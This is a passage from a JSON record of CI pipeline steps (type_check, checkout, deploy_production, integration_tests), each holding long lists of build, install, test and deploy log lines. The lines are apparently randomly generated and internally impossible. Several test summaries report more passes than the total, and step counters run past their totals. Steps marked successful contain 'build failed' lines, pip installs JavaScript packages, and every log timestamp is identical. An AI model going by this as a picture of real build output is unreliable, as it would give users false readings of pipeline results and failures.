          "[12:47:36] DEBUG: Connection pool: 13 active",
          "Bundling main.css",
          "npm install: resolved 781 packages",
          "Completed.",
          "Transforming 274 files...",
          "Cache restored successfully (114MB)",
          "Uploading artifact 'dist' (9 files)",
          "WARNING: prettier has known vulnerabilities",
          "Image pulled successfully",
          "Switched to branch 'feature/task-890'",
          "Compiling lib/service.java...",
          "HEAD is now at f5e33a7",
          "Completed.",
          "Bundling styles.js",
          "Platform: darwin-arm64",
          "Compiling lib/utils.go...",
          "Finished.",
          "Layer 9/15: ENV command",
          "  PASS: unit/test_user_create.spec.js",
          "WARNING: react has known vulnerabilities",
          "Uploading artifact 'dist' (2 files)",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 38 passed, 33 total",
          "Step 8/21: Linting",
          "npm install: added 241 packages",
          "Checking out develop branch",
          "[12:47:36] ERROR: Connection failed",
          "Layer 6/15: COPY command",
          "[12:47:36] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 1513 packages",
          "Platform: linux-x64",
          "Ran 43 tests in 49s",
          "Creating production build...",
          "Checking out main branch",
          "Step 12/25: Deploying",
          "Step 19/16: Deploying",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "Step 10/18: Running migrations",
          "[12:47:36] DEBUG: Initializing service",
          "Creating production build...",
          "Building Docker image...",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 121 packages",
          "Platform: win32-x64",
          "Test Suites: 40 passed, 11 total",
          "Using Node.js 17.7.7",
          "Connection established",
          "Artifact uploaded: dist.zip (10MB)",
          "Cache saved successfully",
          "\u2713 Task completed in 459ms",
          "Completed.",
          "Using Node.js 20.10.2",
          "Using Python 3.10",
          "Compiling components/app.ts...",
          "Snapshots: 11 passed, 4 total",
          "Step 7/18: Building",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 All checks passed",
          "[12:47:36] INFO: Cache refreshed",
          "Fetching from https://github.com/package.json",
          "[12:47:36] DEBUG: Loading configuration",
          "Compiling src/main.py...",
          "Already up to date.",
          "OK",
          "Connection established",
          "Pulling image: alpine:latest",
          "Pushing to registry...",
          "Artifact downloaded: 14MB",
          "[12:47:36] DEBUG: Query executed in 67ms",
          "Checking out main branch",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Switched to branch 'bugfix/task-396'",
          "\u2713 All checks passed",
          "Exception: NullPointerException",
          "Loading...",
          "\u2713 package completed",
          "Uploading artifact 'dist' (12 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 20/22: Linting",
          "Cache saved successfully",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 5/24: Testing",
          "Pushing to registry...",
          "Compiling src/main.py...",
          "Processing...",
          "Step 13/15: Building",
          "Fetching submodules...",
          "Cache invalidated: build",
          "Test Suites: 16 passed, 47 total",
          "Ready.",
          "pip: Downloading lodash-2.5.tar.gz",
          "Step 13/23: Testing",
          "\u2717 build failed with exit code 24",
          "Using Node.js 15.20.6",
          "Cache miss for key-6210",
          "Compiling utils/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Snapshots: 48 passed, 9 total",
          "pip install: Successfully installed axios-4.20",
          "Coverage: 92% statements, 83% branches",
          "Pushing to registry...",
          "Success!",
          "Cache miss for key-3316",
          "[12:47:36] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Compiling lib/main.py...",
          "Pushing to registry...",
          "Installing eslint@3.9.3",
          "Already up to date.",
          "Processing...",
          "Platform: darwin-arm64",
          "Loading...",
          "Building Docker image...",
          "npm install: added 451 packages",
          "Bundling vendor.js",
          "\u2713 Step 'test' succeeded",
          "Cache restored successfully (268MB)",
          "[12:47:36] DEBUG: Loading configuration",
          "Processing...",
          "npm install: resolved 1554 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Building Docker image...",
          "Generating source maps...",
          "Optimizing 98 modules...",
          "[12:47:36] INFO: Request completed",
          "Compiling components/index.js...",
          "Fetching from https://registry.npmjs.org/package.json",
          "\u2713 All checks passed",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "GET /health - 201 (26ms)",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] INFO: Processing request",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "Loading...",
          "Creating production build...",
          "Cache saved successfully",
          "Cache saved successfully",
          "Test Suites: 6 passed, 36 total",
          "Creating production build...",
          "WARNING: eslint has known vulnerabilities",
          "Completed.",
          "npm notice: package.json updated",
          "Using Python 3.11",
          "Step 15/20: Building",
          "GET /status - 204 (60ms)",
          "[12:47:36] DEBUG: Initializing service",
          "[12:47:36] DEBUG: Memory usage: 534MB",
          "pip install: Successfully installed webpack-1.19",
          "[12:47:36] INFO: Processing request",
          "Checking out master branch",
          "Minifying app.js",
          "Environment: test",
          "Optimizing 23 modules...",
          "Switched to branch 'hotfix/task-208'",
          "yarn add: Done in 26.17s",
          "POST /api - 200 (128ms)",
          "Cache hit for key-8583",
          "Ran 25 tests in 23s",
          "\u2713 All checks passed",
          "Done.",
          "[12:47:36] INFO: Cache refreshed",
          "Ran 98 tests in 18s",
          "Building Docker image...",
          "\u2713 Step 'checkout' succeeded",
          "Step 9/17: Deploying",
          "[12:47:36] INFO: Connecting to database",
          "Ran 61 tests in 28s",
          "WARNING: express has known vulnerabilities",
          "Ran 31 tests in 19s",
          "Ready.",
          "Step 12/17: Installing dependencies",
          "\u2713 Step 'setup' succeeded",
          "Connection established",
          "OK",
          "Environment: development",
          "WARNING: eslint has known vulnerabilities",
          "Switched to branch 'bugfix/task-615'",
          "Cache invalidated: dependencies",
          "Connection established",
          "GET /api - 204 (49ms)",
          "Success!",
          "Step 8/24: Running migrations",
          "Checking out main branch",
          "Completed.",
          "Test Suites: 14 passed, 30 total",
          "Using Python 3.11",
          "  PASS: integration/test_db_connect.spec.js",
          "Test Suites: 40 passed, 12 total",
          "Done.",
          "[12:47:36] DEBUG: Initializing service",
          "[12:47:36] INFO: Connecting to database",
          "Bundling vendor.css",
          "Tests: 279 passed, 259 total",
          "[12:47:36] WARN: Deprecated API usage",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-27T12:49:57.536471",
        "finished_at": "2025-11-27T12:50:03.427716",
        "log_lines": [
          "=== Step: checkout ===",
          "Layer 2/10: ENV command",
          "Minifying app.js",
          "Ready.",
          "Verifying...",
          "Optimizing 15 modules...",
          "npm notice: package.json updated",
          "  PASS: integration/test_cache_hit.spec.js",
          "Ran 175 tests in 7s",
          "Switched to branch 'feature/task-657'",
          "Done.",
          "Bundling vendor.js",
          "npm notice: package.json updated",
          "Compiling utils/app.ts...",
          "Cache saved successfully",
          "Snapshots: 12 passed, 14 total",
          "Cache restored successfully (422MB)",
          "Using Node.js 17.4.4",
          "[12:47:36] INFO: Processing request",
          "npm notice: package.json updated",
          "GET /api - 204 (87ms)",
          "Step 12/24: Running migrations",
          "\u2713 Task completed in 1666ms",
          "Creating production build...",
          "Tests: 396 passed, 182 total",
          "npm install: added 241 packages",
          "[12:47:36] WARN: Deprecated API usage",
          "  PASS: test_user_create (132ms)",
          "Time: 78.972s",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:47:36] DEBUG: Connection pool: 19 active",
          "\u2713 All checks passed",
          "[12:47:36] DEBUG: Connection pool: 10 active",
          "Ready.",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 1 passed, 38 total",
          "Step 20/23: Running migrations",
          "pip: Collecting webpack",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Optimizing 20 modules...",
          "npm install: added 27 packages",
          "[12:47:36] DEBUG: Connection pool: 10 active",
          "[12:47:36] INFO: Cache refreshed",
          "Installing jest@4.16.2",
          "[12:47:36] WARN: Deprecated API usage",
          "Transforming 454 files...",
          "Step 16/25: Running migrations",
          "Minifying app.js",
          "Step 6/20: Running migrations",
          "Cache restored successfully (335MB)",
          "Processing...",
          "NODE_ENV=test",
          "Image pulled successfully",
          "[12:47:36] DEBUG: Connection pool: 5 active",
          "  PASS: test_auth_login (356ms)",
          "pip: Collecting prettier",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 28 passed, 35 total",
          "[12:47:36] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "POST /upload - 201 (49ms)",
          "[12:47:36] DEBUG: Loading configuration",
          "[12:47:36] DEBUG: Connection pool: 10 active",
          "[12:47:36] DEBUG: Connection pool: 2 active",
          "[12:47:36] WARN: Deprecated API usage",
          "pip: Collecting axios",
          "Platform: linux-x64",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 45MB",
          "Snapshots: 23 passed, 42 total",
          "Cache miss for key-6171",
          "  PASS: integration/test_db_connect.spec.js",
          "Using Python 3.12",
          "[12:47:36] INFO: Starting build process",
          "Artifact downloaded: 25MB",
          "Step 12/22: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "Step 10/18: Deploying",
          "Pulling image: node:latest",
          "pip: Downloading react-2.17.tar.gz",
          "[12:47:36] DEBUG: Initializing service",
          "pip: Collecting eslint",
          "Layer 5/12: ENV command",
          "OK",
          "Fetching submodules...",
          "npm install: resolved 1042 packages",
          "OK",
          "Finished.",
          "Pushing to registry...",
          "[12:47:36] DEBUG: Memory usage: 947MB",
          "Generating source maps...",
          "Minifying main.js",
          "Waiting...",
          "[12:47:36] WARN: Deprecated API usage",
          "Cache restored successfully (158MB)",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Using Node.js 17.1.8",
          "\u2717 build failed with exit code 122",
          "Step 10/19: Running migrations",
          "WARNING: express has known vulnerabilities",
          "Environment: production",
          "Step 5/15: Installing dependencies",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "[12:47:36] INFO: Cache refreshed",
          "Step 18/15: Linting",
          "Artifact downloaded: 37MB",
          "Coverage: 95% statements, 87% branches",
          "Compiling src/service.java...",
          "\u2713 Step 'checkout' succeeded",
          "Using Node.js 16.3.6",
          "pip: Installing build dependencies...",
          "Compiling src/handler.rs...",
          "TLS handshake completed",
          "OK",
          "Success!",
          "Completed.",
          "Compiling src/utils.go...",
          "[12:47:36] DEBUG: Connection pool: 8 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Tests: 394 passed, 498 total",
          "TLS handshake completed",
          "Using Node.js 15.11.1",
          "  PASS: test_auth_login (66ms)",
          "Cache restored successfully (258MB)",
          "[12:47:36] INFO: Cache refreshed",
          "\u2713 Task completed in 771ms",
          "Switched to branch 'feature/task-795'",
          "Using Node.js 18.1.7",
          "[12:47:36] INFO: Connecting to database",
          "Step 1/23: Building",
          "Pushing to registry...",
          "\u2713 Task completed in 1104ms",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "Optimizing 54 modules...",
          "Step 8/25: Linting",
          "[12:47:36] DEBUG: Query executed in 66ms",
          "[12:47:36] DEBUG: Loading configuration",
          "POST /upload - 200 (68ms)",
          "Cache invalidated: node_modules",
          "WARNING: react has known vulnerabilities",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (18MB)",
          "WARNING: webpack has known vulnerabilities",
          "Time: 115.193s",
          "Step 6/24: Testing",
          "NODE_ENV=development",
          "POST /data - 200 (118ms)",
          "[12:47:36] INFO: Starting build process",
          "[12:47:36] INFO: Connecting to database",
          "Creating production build...",
          "Exception: NullPointerException",
          "Coverage: 84% statements, 95% branches",
          "Optimizing 57 modules...",
          "POST /api - 202 (14ms)",
          "Compiling src/app.ts...",
          "TLS handshake completed",
          "  PASS: test_user_create (466ms)",
          "Cache restored successfully (104MB)",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching from https://pypi.org/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 13 passed, 34 total",
          "[12:47:36] DEBUG: Memory usage: 1397MB",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Ran 67 tests in 30s",
          "Step 15/19: Building",
          "Cache restored successfully (468MB)",
          "Compiling lib/service.java...",
          "Test Suites: 7 passed, 20 total",
          "HEAD is now at 639ddd1",
          "Optimizing 41 modules...",
          "pip: Downloading axios-5.3.tar.gz",
          "Ran 98 tests in 23s",
          "[12:47:36] DEBUG: Query executed in 93ms",
          "[12:47:36] DEBUG: Loading configuration",
          "\u2713 Step 'checkout' succeeded",
          "TLS handshake completed",
          "[12:47:36] INFO: Connecting to database",
          "Step 16/15: Deploying",
          "Pulling image: python:3.11",
          "Step 17/22: Testing",
          "Generating source maps...",
          "Ready.",
          "Fetching from https://googleapis.com/package.json",
          "Ready.",
          "Using Python 3.11",
          "[12:47:36] DEBUG: Query executed in 28ms",
          "[12:47:36] DEBUG: Loading configuration",
          "[12:47:36] WARN: Deprecated API usage",
          "Artifact downloaded: 4MB",
          "Layer 10/10: RUN command",
          "Minifying main.js",
          "Connection established",
          "npm notice: created a lockfile",
          "Loading...",
          "[12:47:36] DEBUG: Initializing service",
          "[12:47:36] DEBUG: Initializing service",
          "Finished.",
          "Environment: staging",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "pip install: Successfully installed jest-2.0",
          "[12:47:36] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "NODE_ENV=development",
          "Switched to branch 'hotfix/task-216'",
          "[12:47:36] DEBUG: Connection pool: 16 active",
          "Cache invalidated: build",
          "Platform: linux-x64",
          "Time: 102.511s",
          "Compiling lib/app.ts...",
          "Installing prettier@3.15.8",
          "yarn add: Done in 12.52s",
          "  PASS: integration/test_auth_login.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "pip: Downloading webpack-1.18.tar.gz",
          "Cache miss for key-9077",
          "Bundling styles.css",
          "POST /api - 202 (330ms)",
          "Cache hit for key-3494",
          "Coverage: 91% statements, 85% branches",
          "TLS handshake completed",
          "[12:47:36] DEBUG: Connection pool: 14 active",
          "GET /status - 200 (37ms)",
          "pip: Downloading eslint-3.19.tar.gz",
          "Ready.",
          "WARNING: lodash has known vulnerabilities",
          "Cache invalidated: dependencies",
          "Step 20/19: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:36] DEBUG: Query executed in 99ms",
          "[12:47:36] DEBUG: Loading configuration",
          "Success!",
          "WARNING: jest has known vulnerabilities",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-27T12:50:03.427716",
        "finished_at": "2025-11-27T12:50:09.318961",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 38 modules...",
          "Loading...",
          "Cache saved successfully",
          "Installing react@2.2.7",
          "Compiling utils/service.java...",
          "Step 17/15: Running migrations",
          "  PASS: e2e/test_user_create.spec.js",
          "Optimizing 29 modules...",
          "Connection established",
          "npm install: added 187 packages",
          "GET /api - 204 (12ms)",
          "Installing react@2.12.7",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: unit/test_user_create.spec.js",
          "Cache invalidated: build",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Uploading artifact 'build' (14 files)",
          "pip: Downloading axios-2.15.tar.gz",
          "OK",
          "Building Docker image...",
          "npm install: added 29 packages",
          "npm notice: created a lockfile",
          "Compiling src/utils.go...",
          "Environment: test",
          "Installing prettier@4.17.10",
          "Compiling src/utils.go...",
          "Compiling lib/main.py...",
          "Cache hit for key-3453",
          "WARNING: jest has known vulnerabilities",
          "Step 2/16: Installing dependencies",
          "Creating production build...",
          "npm install: resolved 394 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out develop branch",
          "Transforming 913 files...",
          "Time: 26.990s",
          "Coverage: 100% statements, 89% branches",
          "Bundling styles.js",
          "Snapshots: 22 passed, 33 total",
          "  PASS: test_auth_login (43ms)",
          "[12:47:36] INFO: Cache refreshed",
          "Layer 7/15: COPY command",
          "[12:47:36] DEBUG: Query executed in 85ms",
          "npm install: resolved 1988 packages",
          "HEAD is now at 199c016",
          "npm install: resolved 1906 packages",
          "[12:47:36] WARN: Deprecated API usage",
          "Ran 190 tests in 7s",
          "Building Docker image...",
          "[12:47:36] DEBUG: Connection pool: 20 active",
          "yarn add: Done in 15.31s",
          "Building Docker image...",
          "pip install: Successfully installed webpack-3.16",
          "[12:47:36] DEBUG: Memory usage: 1616MB",
          "Environment: development",
          "[12:47:36] DEBUG: Initializing service",
          "Already up to date.",
          "[12:47:36] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Node.js 19.1.7",
          "Fetching from https://pypi.org/package.json",
          "\u2713 Step 'checkout' succeeded",
          "Pushing to registry...",
          "Bundling vendor.css",
          "[12:47:36] INFO: Starting build process",
          "pip install: Successfully installed lodash-2.7",
          "Loading...",
          "HEAD is now at efe9797",
          "Optimizing 29 modules...",
          "Finished.",
          "Environment: staging",
          "Compiling lib/handler.rs...",
          "Processing...",
          "[12:47:36] INFO: Cache refreshed",
          "Pulling image: python:3.11",
          "pip: Installing build dependencies...",
          "[12:47:36] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (87MB)",
          "Step 1/15: Running migrations",
          "[12:47:36] INFO: Request completed",
          "Switched to branch 'hotfix/task-342'",
          "Step 8/15: Building",
          "Switched to branch 'feature/task-577'",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 8",
          "Checking out develop branch",
          "OK",
          "Snapshots: 1 passed, 17 total",
          "HEAD is now at d378d00",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "POST /data - 202 (105ms)",
          "Step 18/24: Installing dependencies",
          "Cache invalidated: build",
          "pip: Downloading prettier-4.19.tar.gz",
          "Environment: test",
          "Compiling src/service.java...",
          "FAILED: test_db_connect",
          "Pushing to registry...",
          "Minifying vendor.js",
          "pip: Collecting react",
          "yarn add: Done in 23.14s",
          "npm install: resolved 1937 packages",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] DEBUG: Connection pool: 11 active",
          "  PASS: unit/test_api_health.spec.js",
          "GET /status - 201 (18ms)",
          "Compiling utils/service.java...",
          "WARNING: axios has known vulnerabilities",
          "Step 3/24: Installing dependencies",
          "FAILED: test_api_health",
          "Exception: TypeError",
          "Cache saved successfully",
          "Cache hit for key-1384",
          "Platform: win32-x64",
          "Coverage: 75% statements, 94% branches",
          "\u2713 Step 'install' succeeded",
          "[12:47:36] INFO: Starting build process",
          "Environment: production",
          "\u2717 build failed with exit code 56",
          "Platform: darwin-arm64",
          "Done.",
          "Optimizing 49 modules...",
          "NODE_ENV=development",
          "Compiling components/handler.rs...",
          "Compiling lib/index.js...",
          "Step 14/24: Running migrations",
          "  PASS: unit/test_cache_hit.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "[12:47:36] INFO: Starting build process",
          "WARNING: eslint has known vulnerabilities",
          "Tests: 301 passed, 202 total",
          "[12:47:36] DEBUG: Initializing service",
          "Checking out main branch",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling lib/utils.go...",
          "\u2717 build failed with exit code 50",
          "Step 1/23: Running migrations",
          "Coverage: 82% statements, 78% branches",
          "[12:47:36] DEBUG: Query executed in 25ms",
          "NODE_ENV=test",
          "Generating source maps...",
          "Verifying...",
          "Environment: development",
          "Checking out main branch",
          "Fetching from https://docker.io/package.json",
          "pip: Installing build dependencies...",
          "Compiling utils/handler.rs...",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Uploading artifact 'build' (16 files)",
          "Done.",
          "Ran 78 tests in 11s",
          "WARNING: prettier has known vulnerabilities",
          "Processing...",
          "pip: Collecting prettier",
          "npm notice: created a lockfile",
          "Cache saved successfully",
          "Ran 35 tests in 36s",
          "pip: Collecting webpack",
          "Platform: linux-x64",
          "[12:47:36] WARN: Deprecated API usage",
          "Completed.",
          "Time: 88.188s",
          "Compiling src/service.java...",
          "Exception: TypeError",
          "Ran 88 tests in 11s",
          "Connection established",
          "Bundling vendor.js",
          "Ready.",
          "Ready.",
          "Using Python 3.11",
          "Finished.",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Optimizing 46 modules...",
          "\u2717 build failed with exit code 30",
          "[12:47:36] INFO: Connecting to database",
          "Fetching from https://pypi.org/package.json",
          "npm install: added 174 packages",
          "POST /data - 201 (74ms)",
          "Cache saved successfully",
          "npm install: added 390 packages",
          "npm install: added 182 packages",
          "npm notice: package.json updated",
          "Fetching from https://github.com/package.json",
          "Compiling utils/index.js...",
          "Already up to date.",
          "Uploading artifact 'build' (4 files)",
          "Snapshots: 36 passed, 36 total",
          "FAILED: test_db_connect",
          "Step 18/19: Building",
          "[12:47:36] INFO: Cache refreshed",
          "Uploading artifact 'build' (24 files)",
          "POST /api - 200 (412ms)",
          "OK",
          "Snapshots: 16 passed, 41 total",
          "NODE_ENV=production",
          "Verifying...",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "  PASS: e2e/test_user_create.spec.js",
          "pip install: Successfully installed eslint-4.0",
          "  PASS: test_cache_hit (279ms)",
          "Step 1/17: Deploying",
          "Platform: darwin-arm64",
          "Layer 8/13: ENV command",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "[12:47:36] INFO: Starting build process",
          "pip install: Successfully installed webpack-4.19",
          "Compiling lib/utils.go...",
          "[12:47:36] INFO: Starting build process",
          "OK",
          "Creating production build...",
          "Fetching submodules...",
          "\u2713 Task completed in 1433ms",
          "Fetching from https://npmjs.org/package.json",
          "Step 20/25: Linting",
          "Compiling utils/handler.rs...",
          "Step 16/24: Linting",
          "Layer 3/14: RUN command",
          "Layer 7/15: RUN command",
          "[12:47:36] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 2/20: Linting",
          "Success!",
          "[12:47:36] INFO: Processing request",
          "Checking out main branch",
          "Layer 2/9: ENV command",
          "Step 9/18: Installing dependencies",
          "Cache saved successfully",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (88MB)",
          "Step 11/18: Running migrations",
          "Step 1/23: Deploying",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-27T12:50:09.318961",
        "finished_at": "2025-11-27T12:50:38.775188",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Compiling components/app.ts...",
          "[12:47:36] ERROR: Connection failed",
          "Building Docker image...",
          "\u2713 package completed",
          "Compiling src/app.ts...",
          "Platform: win32-x64",
          "NODE_ENV=test",
          "npm install: resolved 1367 packages",
          "Step 15/21: Deploying",
          "Generating source maps...",
          "[12:47:36] INFO: Processing request",
          "pip: Collecting jest",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Installing build dependencies...",
          "Uploading artifact 'dist' (46 files)",
          "pip: Collecting jest",
          "npm notice: created a lockfile",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:36] INFO: Connecting to database",
          "[12:47:36] WARN: Deprecated API usage",
          "Minifying main.js",
          "npm notice: created a lockfile",
          "npm install: added 408 packages",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed jest-3.5",
          "TLS handshake completed",
          "GET /status - 200 (80ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "FAILED: test_api_health",
          "Building Docker image...",
          "Creating production build...",
          "WARNING: react has known vulnerabilities",
          "pip: Collecting express",
          "Artifact uploaded: build.tar.gz (47MB)",
          "pip: Collecting eslint",
          "Snapshots: 45 passed, 18 total",
          "[12:47:36] DEBUG: Connection pool: 14 active",
          "Bundling styles.js",
          "HEAD is now at cf8068f",
          "Time: 85.983s",
          "  PASS: test_db_connect (339ms)",
          "[12:47:36] DEBUG: Initializing service",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] ERROR: Connection failed",
          "Switched to branch 'bugfix/task-371'",
          "[12:47:36] DEBUG: Initializing service",
          "Transforming 954 files...",
          "Connection established",
          "[12:47:36] ERROR: Connection failed",
          "\u2713 Step 'test' succeeded",
          "yarn add: Done in 7.40s",
          "Snapshots: 12 passed, 0 total",
          "Installing express@1.17.9",
          "\u2713 All checks passed",
          "[12:47:36] DEBUG: Memory usage: 1733MB",
          "Checking out main branch",
          "[12:47:36] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Compiling components/index.js...",
          "Step 5/25: Linting",
          "Compiling lib/service.java...",
          "Cache hit for key-3610",
          "Bundling runtime.css",
          "Using Python 3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 18.12.5",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing react@4.3.0",
          "[12:47:36] INFO: Starting build process",
          "pip: Collecting prettier",
          "[12:47:36] ERROR: Connection failed",
          "Verifying...",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2713 Step 'build' succeeded",
          "Checking out master branch",
          "Minifying main.js",
          "Compiling lib/main.py...",
          "Waiting...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Waiting...",
          "Bundling runtime.css",
          "Transforming 416 files...",
          "[12:47:36] INFO: Cache refreshed",
          "Generating source maps...",
          "Cache invalidated: build",
          "Switched to branch 'bugfix/task-394'",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Minifying app.js",
          "[12:47:36] ERROR: Connection failed",
          "[12:47:36] INFO: Processing request",
          "[12:47:36] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (88MB)",
          "npm install: resolved 1309 packages",
          "Using Python 3.12",
          "Test Suites: 9 passed, 11 total",
          "[12:47:36] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Using Node.js 14.9.4",
          "\u2713 All checks passed",
          "pip: Collecting jest",
          "Environment: test",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 2438ms",
          "Artifact uploaded: build.tar.gz (31MB)",
          "npm install: resolved 1241 packages",
          "Compiling utils/utils.go...",
          "GET /health - 201 (75ms)",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 3415ms",
          "Transforming 492 files...",
          "Waiting...",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Time: 77.710s",
          "Processing...",
          "Fetching submodules...",
          "NODE_ENV=production",
          "Ran 32 tests in 42s",
          "Finished.",
          "Waiting...",
          "Already up to date.",
          "npm install: resolved 1986 packages",
          "Checking out develop branch",
          "Finished.",
          "Compiling lib/utils.go...",
          "Connection established",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 11",
          "Fetching from https://docker.io/package.json",
          "Optimizing 53 modules...",
          "[12:47:36] DEBUG: Memory usage: 930MB",
          "Time: 82.684s",
          "Uploading artifact 'build' (50 files)",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "[12:47:36] WARN: Deprecated API usage",
          "Cache saved successfully",
          "  PASS: test_auth_login (101ms)",
          "pip: Downloading jest-4.16.tar.gz",
          "npm notice: package.json updated",
          "NODE_ENV=development",
          "Switched to branch 'hotfix/task-611'",
          "Waiting...",
          "Time: 113.993s",
          "Pulling image: node:18",
          "WARNING: lodash has known vulnerabilities",
          "[12:47:36] INFO: Cache refreshed",
          "Layer 5/15: RUN command",
          "[12:47:36] INFO: Request completed",
          "npm notice: created a lockfile",
          "Switched to branch 'feature/task-694'",
          "\u2713 All checks passed",
          "Environment: staging",
          "Checking out develop branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "Ready.",
          "Platform: darwin-arm64",
          "[12:47:36] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Compiling components/index.js...",
          "WARNING: jest has known vulnerabilities",
          "Pushing to registry...",
          "\u2717 build failed with exit code 91",
          "Loading...",
          "HEAD is now at f27c828",
          "Minifying app.js",
          "[12:47:36] ERROR: Connection failed",
          "[12:47:36] DEBUG: Query executed in 63ms",
          "Done.",
          "Waiting...",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "Transforming 245 files...",
          "Checking out main branch",
          "npm notice: created a lockfile",
          "Optimizing 29 modules...",
          "[12:47:36] INFO: Cache refreshed",
          "Connection established",
          "\u2713 Step 'install' succeeded",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_api_health (365ms)",
          "pip: Downloading jest-4.4.tar.gz",
          "npm install: resolved 1538 packages",
          "Checking out main branch",
          "[12:47:36] DEBUG: Initializing service",
          "Processing...",
          "Tests: 179 passed, 457 total",
          "FAILED: test_auth_login",
          "\u2713 All checks passed",
          "Processing...",
          "Installing jest@5.16.6",
          "Building Docker image...",
          "Finished.",
          "Platform: linux-x64",
          "Finished.",
          "[12:47:36] DEBUG: Loading configuration",
          "Building Docker image...",
          "[12:47:36] ERROR: Connection failed",
          "Transforming 124 files...",
          "Ready.",
          "Step 3/24: Building",
          "[12:47:36] INFO: Cache refreshed",
          "Environment: development",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "Pulling image: node:3.11",
